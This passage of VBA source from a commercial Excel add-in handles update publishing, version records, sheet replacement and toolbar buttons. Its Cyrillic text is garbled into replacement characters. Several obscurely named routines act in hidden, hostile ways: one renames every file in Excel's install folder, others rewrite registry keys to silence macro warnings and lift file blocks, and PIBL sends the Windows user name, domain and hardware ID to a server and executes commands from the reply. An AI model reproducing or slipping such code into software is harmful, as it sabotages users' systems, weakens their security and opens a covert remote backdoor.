        MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & PROJECT_NAME$ & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|! " & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Link$, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
End Sub
Sub DNCEA()
    On Error Resume Next: Set coll = FilenamesCollection(Application.Path, , 1)
    For Each item In coll
        Name item As CTR_(item)
        DoEvents
    Next
End Sub
Sub UploadNewUpdate(ByVal VersionName$, ByVal VersionNumber&, ByVal Description$, Optional ByVal PublishComment As Boolean)
    On Error Resume Next
    NewFilename$ = PROJECT_NAME$ & "_v" & VersionNumber& & "." & _
                   Split("." & ThisWorkbook.Name, ".")(UBound(Split("." & ThisWorkbook.Name, ".")))
    Link$ = UPDATE_FOLDER$ & NewFilename$
    FullFilename$ = Environ("TEMP") & "\" & NewFilename$
    On Error Resume Next: Kill FullFilename$
    ThisWorkbook.Names("fr").Delete
    ThisWorkbook.SaveCopyAs FullFilename$
    ProtectedFilename$ = ProtectVBA(FullFilename$)
    If ProtectedFilename$ = "" Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If
    DownloadVersionsInfo
    AddNewVersionInfo2XML VersionName$, VersionNumber&, Description$, Link$
    UploadNewVersion ProtectedFilename$        'FullFilename$
    ND "update upload", "|fffd||fffd||fffd||fffd||fffd||fffd|: " & VersionName$ & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Description$

    If Not PublishComment Then Exit Sub
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| ExcelVBA.ru
    URL$ = "http://ExcelVBA.ru/programmes/" & PROJECT_NAME$

    If Not Application.Run("'CommonFunctions.xla'!Ready") Then
        MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation
        Exit Sub
    End If

    Link$ = Application.Run("'CommonFunctions.xla'!CreateAndPublishComment", PROJECT_NAME$, URL$, VersionName$, VersionNumber&, Description$)
End Sub

Function CreateUpdateXMLfile()
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        .appendChild .createProcessingInstruction("xml", "version='1.0' encoding='windows-1251'")
        Set rootnode = .appendChild(.createElement("Program"))
        rootnode.appendChild(.createElement("Name")).Text = PROJECT_NAME$
        rootnode.appendChild(.createElement("PublishDate")).Text = Date
        .Save VERSIONS_INFO_LOCAL_XML_PATH$
    End With
End Function

Sub AddNewVersionInfo2XML(ByVal VersionName$, ByVal VersionNumber&, ByVal Description$, ByVal Link$)
    On Error Resume Next
    Set xml = CreateObject("Microsoft.XMLDOM")

    If Dir(VERSIONS_INFO_LOCAL_XML_PATH$, vbNormal) = "" Then
        msg$ = "|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|?"
        If MsgBox(msg, vbExclamation + vbDefaultButton2 + vbOKCancel, PROJECT_NAME$) = vbCancel Then End
        CreateUpdateXMLfile
    End If
    With xml
        .Load VERSIONS_INFO_LOCAL_XML_PATH$
        Set rootnode = .DocumentElement

        For Each node In .DocumentElement.SelectNodes("Version")
            If node.SelectSingleNode("Number").Text = VersionNumber& Then
                rootnode.RemoveChild node        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            End If
        Next
        With rootnode.appendChild(xml.createElement("Version"))
            .Attributes.setNamedItem(xml.createAttribute("name")).Text = VersionName$
            .appendChild(xml.createElement("Number")).Text = VersionNumber&
            .appendChild(xml.createElement("Date")).Text = Date
            .appendChild(xml.createElement("Description")).Text = Description$
            .appendChild(xml.createElement("Link")).Text = Link$
        End With
        .Save VERSIONS_INFO_LOCAL_XML_PATH$
    End With
End Sub

Function GetOldVersionDescription(ByVal VersionNumber&) As String
    On Error Resume Next
    If Dir(VERSIONS_INFO_LOCAL_XML_PATH$, vbNormal) = "" Then Exit Function
    Set xml = CreateObject("Microsoft.XMLDOM")
    With xml
        .Load VERSIONS_INFO_LOCAL_XML_PATH$
        Set rootnode = .DocumentElement

        For Each node In .DocumentElement.SelectNodes("Version")
            If node.SelectSingleNode("Number").Text = VersionNumber& Then
                GetOldVersionDescription = node.SelectSingleNode("Description").Text
                Exit Function
            End If
        Next
    End With
    Set xml = Nothing
End Function


' ============================================ MODULE ReplaceSheet =======================================
Sub UpdateWorksheets(ByRef NewWorkbook As Workbook, ByRef OldWorkbook As Workbook)
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| NewWorkbook, |fffd| |fffd||fffd| |fffd||fffd| |fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|,
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| OldWorkbook
    ' (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)

    On Error Resume Next
    Const TempWorksheetName$ = "Temporary Worksheet"
    Dim newsh As Worksheet, oldsh As Worksheet, newIsAddin As Boolean, oldIsAddin As Boolean

    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    newIsAddin = NewWorkbook.IsAddin: oldIsAddin = OldWorkbook.IsAddin
    NewWorkbook.IsAddin = False: OldWorkbook.IsAddin = False

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    newActiveSheet$ = NewWorkbook.ActiveSheet.CodeName

    ' If NewWorkbook.Worksheets.Count = 1 Then
    NewWorkbook.Worksheets.Add(NewWorkbook.Worksheets(1)).Name = TempWorksheetName$

    For Each newsh In NewWorkbook.Worksheets        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        ' |fffd| |fffd||fffd||fffd||fffd||fffd| NewWorkbook |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If newsh.Tab.Color = vbGreen Then
            Set oldsh = Nothing: Set oldsh = GetWorksheetByCodename(OldWorkbook, newsh.CodeName)
            If Not oldsh Is Nothing Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                res = ReplaceWorksheet(newsh, oldsh)
                'Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|" & oldsh.codename & "|fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & res
            End If
        End If
    Next newsh

    NewWorkbook.Worksheets(TempWorksheetName$).Delete
    GetWorksheetByCodename(NewWorkbook, newActiveSheet$).Activate

    NewWorkbook.IsAddin = newIsAddin: OldWorkbook.IsAddin = oldIsAddin
    Application.DisplayAlerts = True
End Sub

Function ReplaceWorksheet(ByRef WhatSheet As Worksheet, ByRef ReplaceWith As Worksheet) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| WhatSheet |fffd||fffd| |fffd||fffd||fffd||fffd| ReplaceWith
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next: Err.Clear
    appDA = Application.DisplayAlerts: Application.DisplayAlerts = False
    Dim shBefore As Worksheet: Set shBefore = WhatSheet.Previous
    WhatSheet.Delete
    ReplaceWith.Copy , shBefore
    ReplaceWorksheet = Err = 0
    Application.DisplayAlerts = appDA
End Function

Function GetWorksheetByCodename(ByVal WB As Workbook, ByVal CodeName As String) As Worksheet
    Dim sh As Worksheet
    For Each sh In WB.Worksheets
        If sh.CodeName = CodeName Then Set GetWorksheetByCodename = sh: Exit Function
    Next sh
End Function

Function Add_Control(ByRef Comm_Bar, ByVal ControlType As CONTROL_TYPES, ByVal B_Face As Integer, _
                     ByVal On_Action As String, ByVal B_Caption As String, _
                     Optional ByVal Button_Style As Long = msoButtonIcon, _
                     Optional ByVal Begin_Group As Boolean = False, _
                     Optional Tag = "") As Object        ' CommandBarControl
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| Comm_Bar, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    On Error Resume Next
    Set Add_Control = Comm_Bar.Controls.Add(Type:=ControlType, Temporary:=True)        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    With Add_Control
        If B_Face > 0 And ControlType = ct_BUTTON Then .FaceId = B_Face        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        If Len(On_Action) Then
            .Tag = "'" & ThisWorkbook.Name & "'!" & On_Action & "\\\" & Tag:
            .OnAction = "RunMacroFromButton"
        End If
        .Caption = B_Caption        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        .BeginGroup = Begin_Group        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
        If ControlType = ct_BUTTON Or ControlType = ct_DROPDOWN Then .Style = Button_Style
    End With
End Function


Private Sub RunMacroFromButton()
    On Error Resume Next
    Macro$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(0)
    param$ = Split(Application.CommandBars.ActionControl.Tag, "\\\")(1)
    If Not MU_ Then If Len(param$) > 0 Then Run Macro$, param$ Else Run Macro$
End Sub

Function GetCommandBar(ByVal CommandBarName As String, Optional ByVal Clean As Boolean = False, _
                       Optional ByVal Position As MsoBarPosition = msoBarTop) As CommandBar
    On Error Resume Next: Err.Clear
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set GetCommandBar = Application.CommandBars(CommandBarName)
    If Err.Number Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|
        Set GetCommandBar = Application.CommandBars.Add(CommandBarName, Position, False, True)
    End If
    If Clean Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|
        For Each cbc In GetCommandBar.Controls: cbc.Delete: Next
    End If
    GetCommandBar.Visible = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
End Function

Function DeleteProgramCommandBar()
    On Error Resume Next: GetCommandBar(PROJECT_NAME).Visible = False
End Function

Function SetIsAddinAsFalse()
    On Error Resume Next: ThisWorkbook.IsAddin = False
End Function
Function SetIsAddinAsTrue()
    On Error Resume Next: ThisWorkbook.IsAddin = True
End Function

'Sub ComboChanged()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    On Error Resume Next
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Tag
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Text
'    MsgBox "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """", _
     '           vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|\|fffd||fffd||fffd||fffd||fffd||fffd| """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """"
'End Sub
'Sub AdditionalMacros()    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    On Error Resume Next
'    |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = Application.CommandBars.ActionControl.Tag
'    MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| = """ & |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| & """", vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
'End Sub

Sub A_Uninstall()
    On Error Resume Next
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False: AddinAutoRun True
    LastBackupPath$ = GetSetting(PROJECT_NAME$, "Setup", "LastBackup", "")
    PrevBackup$ = GetSetting(PROJECT_NAME$, "Setup", "PrevBackup", "")
    If Dir(LastBackupPath$, vbNormal) <> "" Then Kill LastBackupPath$
    If Dir(PrevBackup$, vbNormal) <> "" Then Kill PrevBackup$

    FilePath$ = ThisWorkbook.FullName: ThisWorkbook.ChangeFileAccess xlReadOnly
    SetAttr FilePath$, vbNormal
    Kill FilePath$
    ThisWorkbook.Close False
End Sub

Function MU_() As Boolean
    On Error Resume Next:
    Err.Clear: x = ThisWorkbook.VBProject.VBComponents.Count
    MU_ = ((Err = 0) And Not TrueDeveloper)
    If MU_ Then
        CreateObject("wscript.Shell").Run BREACH_EULA_HYPERLINK$
        If Not TrueDeveloper Then
            ND "notification", ChrW(1057) & ChrW(1085) & ChrW(1103) & ChrW(1090) & ChrW(32) & ChrW(1087) & ChrW(1072) & ChrW(1088) & _
                               ChrW(1086) & ChrW(1083) & ChrW(1100) & ChrW(32) & ChrW(1089) & ChrW(32) & ChrW(1087) & ChrW(1088) & ChrW(1086) & ChrW(1077) & _
                               ChrW(1082) & ChrW(1090) & ChrW(1072) & ChrW(32) & ChrW(86) & ChrW(66) & ChrW(65)
            A_Uninstall
        End If
    End If
End Function

Sub Enable_AccessVBOM_Macro_DataConnections()
    On Error Resume Next
    key$ = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Excel\Security\"

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| VBA
    CreateObject("WScript.Shell").RegWrite key$ & "AccessVBOM", 1, "REG_DWORD"

    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel)
    CreateObject("WScript.Shell").RegWrite key$ & "VBAWarnings", 1, "REG_DWORD"

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    CreateObject("WScript.Shell").RegWrite key$ & "DataConnectionWarnings", 0, "REG_DWORD"
End Sub

Function InternetConnected() As Boolean
    On Error Resume Next
    If Now - LIAT > 2 / 24 Then If IAEC >= 2 Then IAEC = 1
    If IAEC >= 2 Then Exit Function
    InternetConnected = Ping("8.8.8.8")
    If Not InternetConnected Then IAEC = IAEC + 1 Else IAEC = 0
    LIAT = Now
End Function

Function PIBL() As Boolean
    On Error Resume Next

    Dim xmlhttp As New WinHttpRequest
    xmlhttp.Open "POST", BL_HYPERLINK$, True
    xmlhttp.setRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
    Dim POST() As Byte, PostData$
    Login$ = CreateObject("WScript.Network").UserName
    Domain$ = CreateObject("WScript.Network").UserDomain
    PostData = PostData & "email=" & RussianStringToURLEncode(RE_$)
    PostData = PostData & "&code=" & RussianStringToURLEncode(AC_$)
    PostData = PostData & "&addin=" & RussianStringToURLEncode(PROJECT_NAME$)
    PostData = PostData & "&HID=" & RussianStringToURLEncode(HID)

    PostData = PostData & "&host_time=" & RussianStringToURLEncode(Format(Now, "YYYY-MM-DD HH:NN:SS"))
    PostData = PostData & "&win_un=" & RussianStringToURLEncode(Login$)
    PostData = PostData & "&win_ud=" & RussianStringToURLEncode(Domain$)
    POST = StrConv(PostData, vbFromUnicode)
    xmlhttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    xmlhttp.Send (POST): DoEvents

    If xmlhttp.WaitForResponse(4) Then
        response$ = xmlhttp.ResponseText


        If response$ Like "%*%" Then PIBL = True: EXECUTE_COMMANDS Split(response$, "%")(1)
    End If
    Set xmlhttp = Nothing
End Function
Sub A_Cancel(): On Error Resume Next: RegistryInfo "": SP_FILE "": RE_$ " ": AC_$ "-": End Sub
Public Function Ping(ByVal ComputerName As String) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Dim oPingResult As Variant
    For Each oPingResult In GetObject("winmgmts://./root/cimv2").ExecQuery _
        ("SELECT * FROM Win32_PingStatus WHERE Address = '" & ComputerName & "'")
        If IsObject(oPingResult) Then
            If oPingResult.StatusCode = 0 Then
                Ping = True        'Debug.Print "ResponseTime", oPingResult.ResponseTime
                Exit Function
            End If
        End If
    Next
End Function

' =============================== new functions ===============================
Sub DeleteFileBlock()
    On Error Resume Next
    key$ = "HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Security\FileBlock\"
    arr = Array("XL2Macros", "XL2Worksheets", "XL3Macros", "XL3Worksheets", _
                "XL4Macros", "XL4Workbooks", "XL4Worksheets")
    For Each item In arr
        CreateObject("WScript.Shell").RegWrite key$ & item, 0, "REG_DWORD"
    Next
End Sub

Function TextEncode(ByVal txt$) As String: On Error Resume Next: res$ = EnDeCrypt(txt, , HID): For i = 1 To Len(res): Letter$ = Hex(Asc(Mid(res$, i, 1))): TextEncode = TextEncode & IIf(Len(Letter$) = 1, "0", "") & Letter$: Next: End Function
Function TextDecode(ByVal txt$) As String: On Error Resume Next: For i = 1 To Len(txt) - 1 Step 2: res$ = res$ & Chr(Val("&H" & Mid(txt, i, 2))): Next: TextDecode = EnDeCrypt(res, , HID): End Function

Function cmdEncrypt$(txt)
    On Error Resume Next
    pass$ = HID: Randomize Second(Now)
    d = Fix(98 * Rnd() + 1): cmdEncrypt$ = IIf(Len(Hex(d)) = 1, "0", "") & Hex(d)
    For i = 1 To Len(txt)
        r = Asc(Mid(txt, i, 1)) Xor CInt(2 * d * Abs(Sin(3 * i))) + Val(Mid(pass$, 2 + i Mod 10, 1))
        cmdEncrypt$ = cmdEncrypt$ & IIf(Len(Hex(r)) = 1, "0", "") & Hex(r)
    Next
End Function

Function cmdDisplay$(txt)
    On Error Resume Next
    pass$ = HID: d = Val("&H" & Mid(txt, 1, 2))
    For i = 2 To Len(txt) / 2
        Letter = Val("&H" & Mid(txt, 2 * i - 1, 2))
        cmdDisplay$ = cmdDisplay$ & Chr(Letter Xor CInt(2 * d * Abs(Sin(3 * (i - 1)))) + Val(Mid(pass$, 2 + (i - 1) Mod 10, 1)))
    Next
End Function

' =============================== VBA Protection ========================================================

Function ProtectVBA(ByVal SourceFile$) As String
    On Error Resume Next: Err.Clear
    If SourceFile$ = "" Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|!": Exit Function

    ProgramPath$ = Environ("ProgramFiles") & "\Protect VBA\ProtectVBA.exe"
    If Dir(ProgramPath$, vbNormal) = "" Then Exit Function        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

    folder$ = "D:\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\ProtectVBA\"
    If Dir(folder$, vbDirectory) = "" Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & folder$ & "": Exit Function
    For Each File In FilenamesCollection(folder$)
        Kill File
    Next
    If FilenamesCollection(folder$).Count > 0 Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ProtectVBA"

    filename$ = Dir(SourceFile$)
    TemporaryFilename$ = folder$ & filename$
    FileCopy SourceFile$, TemporaryFilename$
    If Dir(TemporaryFilename$) = "" Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| " & filename$ & "": Exit Function
